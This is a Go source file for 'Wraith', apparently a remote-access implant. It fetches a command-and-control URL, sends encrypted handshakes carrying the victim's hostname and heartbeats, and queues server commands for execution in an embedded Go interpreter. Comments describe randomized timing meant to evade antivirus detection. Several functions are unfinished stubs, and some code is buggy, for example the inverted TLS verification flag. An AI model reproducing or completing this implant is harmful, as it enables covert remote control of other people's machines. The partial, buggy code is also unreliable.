// Package Name - main produces an executable
package main

// Dependencies
import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	crand "crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	mrand "math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	yaegi "github.com/containous/yaegi/interp"
	yaegi_stdlib "github.com/containous/yaegi/stdlib"
)

var wraithVersion = "4.0.0"
var protocolVersion = "0"

// Define a global request counter which will make
// it easier to identify individual requests when
// debugging. It will not be used if not debugging
var globalRequestCounter uint64 = 0

// Log message (string) if in debug mode
func dlog(Type int, Message interface{}) {
	if setDEBUG {
		// Get the message type
		var MessageType string
		switch Type {
		case 0:
			MessageType = "INFO"
		case 1:
			MessageType = "WARN"
		case 2:
			MessageType = "ERRO"
		default:
			MessageType = "INFO"
		}
		// Print the message with the current timestamp
		fmt.Printf("<%s> | %s: %v\n", time.Now().Format("15:04:05 02-01-2006"), MessageType, Message)
	}
}

func req(ReqType string, URL string, VerifySSL bool, DataType string, Data string) (string, error) {

	// Define Transport and Client for HTTP communication
	transport := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    15 * time.Second,
		DisableCompression: false,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: VerifySSL},
	}
	client := &http.Client{Transport: transport}

	var (
		resp *http.Response
		err  error
	)

	if ReqType == "GET" {

		// Make GET request
		resp, err = client.Get(URL)

	} else if ReqType == "POST" {

		// Make POST request
		resp, err = client.Post(URL, DataType, strings.NewReader(Data))

	} else {
		return "", errors.New("invalid request method specified")
	}

	if setDEBUG {
		// If debugging, increment the global request counter to keep track
		// of requests.
		globalRequestCounter++
	}

	// Log the request
	dlog(0, "`"+ReqType+"` request (ID `"+fmt.Sprint(globalRequestCounter)+"`) to `"+URL+"`")

	// Handle any errors
	if err != nil {
		return "", errors.New("http request failed with error \"" + err.Error() + "\"")
	} else if resp.StatusCode != 200 {
		// Close the response body when the function returns
		defer resp.Body.Close()
		return "", errors.New("non-200 http response code (" + fmt.Sprint(resp.StatusCode) + ")")
	} else {
		// Close the response body when the function returns
		defer resp.Body.Close()
		// Read the body of the response
		RawBody, err := ioutil.ReadAll(resp.Body)
		// Handle errors in reading the body
		if err != nil {
			return "", errors.New("error while reading the response body")
		}
		// Trim the response body to prevent errors
		body := strings.Trim(string(RawBody), " \n\v\t")
		// Return the response body and no errors
		return body, nil
	}

}

type wraithStruct struct {
	WraithID                 string     // ID of the Wraith assigned by the server
	WraithStartTime          time.Time  // A copy of the Wraith start time
	RunWraith                bool       // A flag controlling whether the Wraith should run
	ControlAPIURL            string     // URL of the C&C server's API page
	APIRequestPrefix         string     // The prefix to add to each API request
	TrustedAPIFingerprint    string     // The fingerprint that must be supplied by API responses for them to be trusted
	CryptKey                 string     // The encryption key to use to communicate with the API
	HeartbeatDelay           uint64     // The delay between each successful heartbeat
	HandshakeReattemptDelay  uint64     // The delay between handshake reattempts if the failed heartbeat tolerance is exceeded
	FailedHeartbeatTolerance uint64     // How many failed handshakes in a row until the connection is reset
	Plugins                  []string   // List of all plugins included with this Wraith
	CommandQueue             []string   // A slice of the commands to be executed
	CommandQueueMutex        sync.Mutex // A mutex preventing CommandQueue from being modified by multiple goroutines at the same time
}

func (wraith *wraithStruct) RefreshAPIURL() error {
	// Send a GET request to setCCSERVERGETURL (we do not verify the SSL
	// certificate as no sensitive information is being transferred and SSL errors
	// could prevent connections to C&C. All other HTTPS connections are verified
	// however)
	response, err := req("GET", setCCSERVERGETURL, false, "", "")

	if err != nil {
		return err
	}

	// Set the API URL to the received string
	wraith.ControlAPIURL = response

	return nil

}

func (wraith *wraithStruct) Encrypt(plaintext string) (string, error) {
	// Adapted from https://github.com/mervick/aes-everywhere/

	// Helper functions
	DeriveKeyAndIv := func(passphrase string, salt string) (string, string) {
		salted := ""
		dI := ""

		for len(salted) < 48 {
			md := md5.New()
			md.Write([]byte(dI + passphrase + salt))
			dM := md.Sum(nil)
			dI = string(dM[:16])
			salted = salted + dI
		}

		key := salted[0:32]
		iv := salted[32:48]

		return key, iv
	}

	PKCS7Padding := func(ciphertext []byte, blockSize int) []byte {
		padding := blockSize - len(ciphertext)%blockSize
		padtext := bytes.Repeat([]byte{byte(padding)}, padding)
		return append(ciphertext, padtext...)
	}

	// Create a salt
	salt := make([]byte, 8)
	if _, err := io.ReadFull(crand.Reader, salt); err != nil {
		return "", err
	}

	// Derive key and initialisation vector
	key, iv := DeriveKeyAndIv(wraith.CryptKey, string(salt))

	// Create a cipher block based on a bytearray of the key
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", err
	}

	// Encrypt the plaintext
	pad := PKCS7Padding([]byte(plaintext), block.BlockSize())
	ecb := cipher.NewCBCEncrypter(block, []byte(iv))
	encrypted := make([]byte, len(pad))
	ecb.CryptBlocks(encrypted, pad)

	return base64.StdEncoding.EncodeToString([]byte("Salted__" + string(salt) + string(encrypted))), nil
}

func (wraith *wraithStruct) Decrypt(ciphertext string) (string, error) {
	// Adapted from https://github.com/mervick/aes-everywhere/

	// Helper functions
	DeriveKeyAndIv := func(passphrase string, salt string) (string, string) {
		salted := ""
		dI := ""

		for len(salted) < 48 {
			md := md5.New()
			md.Write([]byte(dI + passphrase + salt))
			dM := md.Sum(nil)
			dI = string(dM[:16])
			salted = salted + dI
		}

		key := salted[0:32]
		iv := salted[32:48]

		return key, iv
	}

	PKCS7Trimming := func(encrypt []byte) []byte {
		padding := encrypt[len(encrypt)-1]
		return encrypt[:len(encrypt)-int(padding)]
	}

	// Base64 decode the ciphertext
	ct, _ := base64.StdEncoding.DecodeString(ciphertext)
	// Check if it is valid ciphertext
	if len(ct) < 16 || string(ct[:8]) != "Salted__" {
		return "", errors.New("not valid ciphertext")
	}

	// Get the salt, ciphertext, key and initialisation vector
	salt := ct[8:16]
	ct = ct[16:]
	key, iv := DeriveKeyAndIv(wraith.CryptKey, string(salt))

	// Create a cipher block based on a bytearray of the key
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return "", err
	}

	// Decrypt the ciphertext
	cbc := cipher.NewCBCDecrypter(block, []byte(iv))
	dst := make([]byte, len(ct))
	cbc.CryptBlocks(dst, ct)

	return string(PKCS7Trimming(dst)), nil
}

func (wraith *wraithStruct) API(requestData interface{}) (APIResponse map[string]interface{}, APIErr error) {

	// Log the API request
	dlog(0, "request to API with contents `"+fmt.Sprint(requestData)+"`")

	// As JSON decode can cause a panic (if the read data does not match the
	// data type map[string]string but is valid JSON) and en/decrypt probably
	// can too, defer a function to handle the panic
	defer func() {
		// Catch any panics
		if panic := recover(); panic != nil {
			APIResponse = nil
			APIErr = errors.New("api function panicked with error `" + fmt.Sprint(panic) + "`")
		}

		errorToLog := "none"
		if APIErr != nil {
			errorToLog = APIErr.Error()
		}

		// Log the response from the API
		dlog(0, "response from API with contents `"+fmt.Sprint(APIResponse)+"` (error `"+errorToLog+"`)")
	}()

	// Create the prefix
	requestPrefix := wraith.APIRequestPrefix
	// The char after the prefix indicates whether the request is from
	// a Wraith or panel. A non-zero odd number indicates a Wraith while
	// a non-zero even number indicates a panel.
	requestIDCharOptions := []string{"1", "3", "5", "7", "9"}
	requestPrefix += requestIDCharOptions[mrand.Intn(len(requestIDCharOptions))]

	// Convert the message to JSON (results in a bytearray)
	requestDataEncoded, errEncode := json.Marshal(requestData)

	// Check for errors and return them if any
	if errEncode != nil {
		return nil, errEncode
	}

	// Encrypt the JSON data
	requestDataEncrypted, errCrypt := wraith.Encrypt(string(requestDataEncoded))

	// Check for errors and return if any
	if errCrypt != nil {
		return nil, errEncode
	}

	// Add the prefix and protocol version to the base64-encoded, encrypted data
	requestDataFinal := requestPrefix + protocolVersion + requestDataEncrypted

	// Send the final data to the API
	response, errReq := req("POST", wraith.ControlAPIURL, true, "application/octet-stream", requestDataFinal)

	// Check for request errors and return if any
	if errReq != nil {
		return nil, errReq
	}

	// Verify that the response is indeed a valid API response (prefix)
	if !(strings.HasPrefix(response, setAPIREQPREFIX)) {
		return nil, errors.New("not valid API response - no prefix")
	}

	// Remove the prefix from the response (the API does not send an ID char so no need to remove that)
	response = strings.TrimPrefix(response, setAPIREQPREFIX)

	// Try decrypting the API response. If this fails, assume the response is plaintext
	responseDecrypted, errDcrypt := wraith.Decrypt(response)

	// Define variable to hold the processed response
	var finalResponse map[string]interface{}
	// Check for decryption failure
	switch errDcrypt {
	case nil:
		// If there was no decryption error, try to JSON decode the decrypted response
		errDecode := json.Unmarshal([]byte(responseDecrypted), &finalResponse)
		// Sometimes, decryption may work but the result may still not be what
		// we want so fallback to decoding the raw response
		if errDecode != nil {
			goto noDecryptDecode
		}
		break
	noDecryptDecode:
		fallthrough
	default:
		// If there was a decryption error, try to JSON decode the plain response
		errDecode := json.Unmarshal([]byte(response), &finalResponse)
		// If this produces an error, the response was not valid so return an error
		if errDecode != nil {
			return nil, errors.New("not valid API response - incorrectly encrypted/encoded")
		}
	}

	// Verify that the API fingerprint is present and trusted
	if APIFingerprint, ok := finalResponse["api_fingerprint"]; ok {
		if APIFingerprint != wraith.TrustedAPIFingerprint {
			return nil, errors.New("api provided untrusted fingerprint")
		}
	} else {
		return nil, errors.New("api did not identify itself")
	}

	// If an API response contains the `switch_key`, set the encryption key to it
	if switchKey, ok := finalResponse["switch_key"]; ok {
		wraith.CryptKey = fmt.Sprint(switchKey)
	}

	// Finally, check if the API replied with a success code or if it reports an error
	// or nothing
	if statusCode, ok := finalResponse["status"]; ok {
		if statusCode == "SUCCESS" {
			// If the API reply indicates success

			// Nothing
		} else if statusCode == "ERROR" {
			// If the API reply indicates error

			// Return the response dict along with an error

			// Check if the server has provided an error message
			if errMsg, ok := finalResponse["message"]; ok {
				// If it has, include it in the error
				return finalResponse, errors.New("api returned an error code with message `" + fmt.Sprint(errMsg) + "`")
			}
			// If it has not, return a less informative error message
			return finalResponse, errors.New("api returned an error code without any message")
		} else {
			// No other reply is valid in this protocol so error
			return finalResponse, errors.New("api returned invalid status code")
		}
	} else {
		// If no status code was supplied, assume success
		finalResponse["status"] = "SUCCESS"
	}

	return finalResponse, nil

}

func (wraith *wraithStruct) Handshake() error {

	// Get required data
	hostname, hostnameGetErr := os.Hostname()
	if hostnameGetErr != nil {
		hostname = "null"
	}

	// Create data required by the panel for logging in
	data := map[string]interface{}{
		"req_type": "handshake",
		"host_info": map[string]interface{}{
			"arch":        "",
			"hostname":    hostname,
			"os_type":     "",
			"os_version":  "",
			"reported_ip": "",
		},
		"wraith_info": map[string]interface{}{
			"version":      "",
			"start_time":   "",
			"plugins":      "",
			"env":          "",
			"pid":          "",
			"ppid":         "",
			"running_user": "",
		},
	}

	// Send the data
	wraith.API(data)

	return nil

}

func (wraith *wraithStruct) Heartbeat() error {
	return errors.New("")
}

func (wraith *wraithStruct) Exec(command string) {

	// Create an interpreter instance to run golang scripts (commands)
	i := yaegi.New(yaegi.Options{})

	// TODO
	i.Use(yaegi_stdlib.Symbols)

	_, err := i.Eval(`import "fmt"`)
	if err != nil {
		panic(err)
	}

}

// Main function to run on Wraith start
func main() {

	// Get the start time of the Wraith
	WraithStartTime := time.Now()

	// Print some debugging information if debug mode is enabled
	dlog(0, "RUNNING IN DEBUG MODE!")
	dlog(0, "Wraith version `v"+wraithVersion+"`")
	dlog(0, "Wraith started at `"+WraithStartTime.Format("15:04:05 02-01-2006")+"`")

	// Seed the random number generator with the current time plus the start time
	mrand.Seed(time.Now().UTC().UnixNano() + WraithStartTime.UTC().UnixNano())

	// Log imported plugins
	dlog(0, "using plugins `"+fmt.Sprint(setPLUGINS)+"`")

	// Create an instace of Wraith
	wraith := wraithStruct{}
	// Set the Wraith properties to their defaults
	wraith.WraithID = ""
	wraith.WraithStartTime = WraithStartTime
	wraith.RunWraith = true
	wraith.ControlAPIURL = ""
	wraith.APIRequestPrefix = setAPIREQPREFIX
	wraith.TrustedAPIFingerprint = setTRUSTEDSERVERFINGERPRINT
	wraith.CryptKey = setSECONDLAYERENCRYPTIONKEY
	wraith.HeartbeatDelay = setDEFAULTHEARTBEATDELAYBASE
	wraith.HandshakeReattemptDelay = setDEFAULTHANDSHAKEREATTEMPTDELAY
	wraith.FailedHeartbeatTolerance = setFAILEDHEARTBEATTOLERANCE
	wraith.Plugins = setPLUGINS
	wraith.CommandQueue = []string{}
	wraith.CommandQueueMutex = sync.Mutex{}

	// Get the URL of the API we connect to. Repeat until success
	for {
		dlog(0, "refreshing API URL")
		// Refresh the API URL
		err := wraith.RefreshAPIURL()

		if err != nil {
			// Display the error
			dlog(3, "error while refreshing API URL `"+err.Error()+"`")
			dlog(0, "eetrying API URL refresh in `"+fmt.Sprint(setDEFAULTHANDSHAKEREATTEMPTDELAY)+"` seconds")
			// Wait for the handshake reattempt delay since it is similar to this event
			time.Sleep(time.Duration(setDEFAULTHANDSHAKEREATTEMPTDELAY) * time.Second)
		} else {
			// Log that the API URL was successfuly refreshed
			dlog(3, "API URL refreshed to `"+wraith.ControlAPIURL+"`")
			break
		}
	}

	// Counter for the number of failed heartbeats in a row. Initially set this
	// to the maximum tolerated amount as the first handshake will always fail
	// anyway due to the Wraith not being logged in
	FailedHeartbeatCounter := wraith.FailedHeartbeatTolerance
	// Main Wraith loop - run until exit flag on Wraith is set
	for wraith.RunWraith {

		// If the heartbeat failed for whatever reason
		if heartbeatErr := wraith.Heartbeat(); heartbeatErr != nil {
			// Increment the counter
			FailedHeartbeatCounter++

			dlog(3, "sending heartbeat to api at `"+wraith.ControlAPIURL+"` failed and the failed heartbeat tolerance was exceeded so retrying handshake")

			// If the counter exceeds the failed heartbeat tolerance
			if FailedHeartbeatCounter > wraith.FailedHeartbeatTolerance {

				// Reset the encryption key so we can communicate with the server
				wraith.CryptKey = setSECONDLAYERENCRYPTIONKEY

				// Try to perform a handshake again to re-set the connection
				for handshakeErr := wraith.Handshake(); handshakeErr != nil; {

					dlog(3, "handshake with server at `"+wraith.ControlAPIURL+"` failed")

					// Add between 0 and 3 seconds to the delay randomly
					// This should prevent the requests from appearing to be automated
					// and make the Wraith less detectable to antivirus software
					nextHandshakeDelay := wraith.HandshakeReattemptDelay + uint64(mrand.Intn(3))

					dlog(0, "retrying handshake in `"+fmt.Sprint(nextHandshakeDelay)+"` seconds")

					time.Sleep(time.Duration(nextHandshakeDelay) * time.Second)

					// Refresh the C&C API URL. We may have disconnected due to an address change.
					// This does not need error checking as we will loop back to it anyway unless
					// we handshake successfully in which case it's not needed.
					wraith.RefreshAPIURL()

				}

				// The handshake succeeded so log it and wait for heartbeat
				nextHandshakeDelay := wraith.HeartbeatDelay + uint64(mrand.Intn(3))
				dlog(0, "handshake succeeded so sending heartbeat in `"+fmt.Sprint(nextHandshakeDelay)+"` seconds")
				time.Sleep(time.Duration(nextHandshakeDelay) * time.Second)

			} else {
				// If the heartbeat failed but the failed heartbeat tolerance was
				// not exceeded, wait then retry
				dlog(3, "heartbeat with api at `"+wraith.ControlAPIURL+"` failed but the failed heartbeat tolerance was not exceeded")

				nextHeartbeatDelay := wraith.HeartbeatDelay + uint64(mrand.Intn(3))
				dlog(0, "resending heartbeat in `"+fmt.Sprint(nextHeartbeatDelay)+"` seconds")
				time.Sleep(time.Duration(nextHeartbeatDelay) * time.Second)
			}

		} else {
			// If the heartbeat succeeded, reset the fail counter
			FailedHeartbeatCounter = 0

			// And log the successful heartbeat
			dlog(0, "successful heartbeat with api at `"+wraith.ControlAPIURL+"`")

			// Then execute any new commands
			for _, command := range wraith.CommandQueue {
				wraith.Exec(command)
			}

			// Then wait for next heartbeat
			nextHeartbeatDelay := wraith.HeartbeatDelay + uint64(mrand.Intn(3))
			time.Sleep(time.Duration(nextHeartbeatDelay) * time.Second)
		}

	}
}
